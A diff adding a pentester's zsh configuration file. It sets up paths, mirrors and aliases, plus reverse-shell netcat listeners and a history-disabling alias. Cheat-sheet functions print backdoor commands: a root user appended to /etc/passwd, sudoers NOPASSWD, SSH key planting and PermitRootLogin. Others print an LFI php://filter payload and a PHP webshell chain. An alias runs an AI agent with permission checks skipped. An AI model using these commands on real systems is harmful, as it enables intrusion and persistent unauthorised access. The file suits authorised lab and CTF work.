@@ -1,0 +1,101 @@
+# ==================== 路径 ====================
+PENTEST_DIR="${PENTEST_DIR:-$HOME/pentest}"
+typeset -U path
+path=($HOME/.local/bin $PENTEST_DIR/tools/{python,shell} $HOME/go/bin $path)
+
+# ==================== eza（Oh My Zsh 插件） ====================
+# 需在 .zshrc 的 plugins=(...) 中启用 eza
+zstyle ':omz:plugins:eza' 'icons' yes
+zstyle ':omz:plugins:eza' 'dirs-first' yes
+zstyle ':omz:plugins:eza' 'header' yes
+zstyle ':omz:plugins:eza' 'git-status' yes
+zstyle ':omz:plugins:eza' 'time-style' long-iso
+
+# ==================== zoxide ====================
+if command -v zoxide >/dev/null 2>&1; then
+    eval "$(zoxide init zsh)"
+fi
+
+# ==================== Node.js（fnm） ====================
+export FNM_NODE_DIST_MIRROR="https://npmmirror.com/mirrors/node/"
+if command -v fnm >/dev/null 2>&1; then
+    eval "$(fnm env --use-on-cd --shell zsh)"
+fi
+
+# ==================== 环境 ====================
+export GO111MODULE=on GOPATH=$HOME/go GOBIN=$GOPATH/bin
+export GOPROXY=https://goproxy.cn,https://mirrors.aliyun.com/goproxy/,direct
+export PYTHON_BUILD_MIRROR_URL="https://mirrors.aliyun.com/python"
+export PYTHONWARNINGS="ignore::DeprecationWarning,ignore::SyntaxWarning,ignore::UserWarning"
+
+# ==================== 历史 ====================
+HISTSIZE=10000; SAVEHIST=10000
+setopt SHARE_HISTORY HIST_IGNORE_DUPS HIST_IGNORE_SPACE
+
+# ==================== 别名 ====================
+# 安全删除：rm 进回收站（彻底删除用 command rm 或 /bin/rm）
+if command -v trash-put >/dev/null 2>&1; then
+    alias rm='trash-put'
+fi
+alias vih='vim +$ /etc/hosts'
+alias tf='tail -f' fd='fdfind' reload='source ~/.zshrc'
+alias noh='export HISTFILE=/dev/null' py='python3'
+alias rscp='rsync -v -P -e ssh' sp='searchsploit' pc='proxychains -q'
+alias wget='wget --no-check-certificate' nmap='grc nmap'
+alias code='code --no-sandbox --user-data-dir=/root/.vscode'
+alias ctc='xclip -sel clip' vtc='xclip -o -sel clipboard'
+alias lo='tr "[:upper:]" "[:lower:]"'
+alias ips='ifconfig | grep -oP "inet \K[\d.]+" | grep -v "127.0"'
+alias cl='IS_SANDBOX=1 claude --dangerously-skip-permissions'
+alias synctime='timedatectl set-timezone Asia/Shanghai && ntpdate time.windows.com && timedatectl set-ntp off'
+
+# ==================== 函数 ====================
+IP() { [[ -n "$1" ]] && echo "$1" > ~/.target_ip || cat ~/.target_ip; }
+serve() { python3 -m http.server "${1:-80}"; }
+# yazi：退出时把文件管理器当前目录带回 shell
+y() {
+  local tmp cwd
+  tmp="$(mktemp -t yazi-cwd.XXXXXX)"
+  command yazi "$@" --cwd-file="$tmp"
+  if cwd="$(command cat -- "$tmp")" && [[ -n "$cwd" && "$cwd" != "$PWD" ]]; then
+    builtin cd -- "$cwd"
+  fi
+  /bin/rm -f -- "$tmp"
+}
+ncw() { rlwrap -I -cAr nc -lnvp "${1:-443}"; }
+listener() { local p=${1:-443}; stty raw -echo; (stty size; cat) | nc -lvnp "$p"; }
+bl() { /opt/BloodHound/BloodHound --no-sandbox --disable-gpu --disable-software-rasterizer "$@" >/dev/null 2>&1 &! }
+hades() { sshpass -p "$2" ssh -p 6666 "$1"@hades.hackmyvm.eu; }
+give_flag() { local t="${1:-user}"; echo "flag{${t}-$(echo "${RANDOM}${RANDOM}" | md5sum | awk '{print $1}')}"; }
+give_pass() { tr -dc 'A-Za-z0-9' < /dev/urandom | fold -w "${1:-16}" | head -n1; }
+
+list-nmap-ports() {
+  local n=$1 proto=${2:-tcp} flag=${proto/tcp/-sS/udp/-sU}
+  sudo nmap "$flag" -oX - --top-ports "$n" 2>/dev/null | sed -n 's/.*services="\([^"]*\)".*/\1/p'
+}
+
+proxy() {
+  local addr="http://127.0.0.1:${1:-7890}"
+  export http_proxy=$addr https_proxy=$addr all_proxy=$addr HTTP_PROXY=$addr HTTPS_PROXY=$addr ALL_PROXY=$addr
+  echo "[+] Proxy: $addr"
+}
+unproxy() { unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY; echo "[+] Proxy off"; }
+
+kill-bloodhound() {
+  sudo pkill -f bhapi && echo "[+] bhapi stopped" || echo "[-] bhapi not running"
+  sudo neo4j stop && echo "[+] Neo4j stopped" || echo "[-] Neo4j not running"
+  sudo systemctl stop postgresql && echo "[+] PostgreSQL stopped" || echo "[-] PostgreSQL not running"
+  echo "[+] BloodHound stack stopped."
+}
+
+# cheatsheets
+sss() { print -l 'echo "root2:<CRYPT_HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd' 'echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'; }
+kkk() { print -l 'cd ~; mkdir -p .ssh; echo "$(cat ~/.ssh/id_ed25519.pub)" > .ssh/authorized_keys; chmod 700 .ssh; chmod 600 .ssh/*' 'echo "PermitRootLogin yes" >> /etc/ssh/sshd_config; service ssh restart'; }
+filter() { print -l "php://filter/convert.base64-encode/resource=../../../etc/passwd" 'php_filter_chain_generator.py --chain "<?=`$_GET[0]`?>"'; }
+
+# ==================== 杂项 ====================
+bindkey '^Xe' edit-command-line
+unalias gf gau 2>/dev/null
+# 语言由系统 locale 决定（scripts/setup-locale-zh.sh 可切换为中文）
+source /usr/share/doc/fzf/examples/completion.zsh
+source /usr/share/doc/fzf/examples/key-bindings.zsh
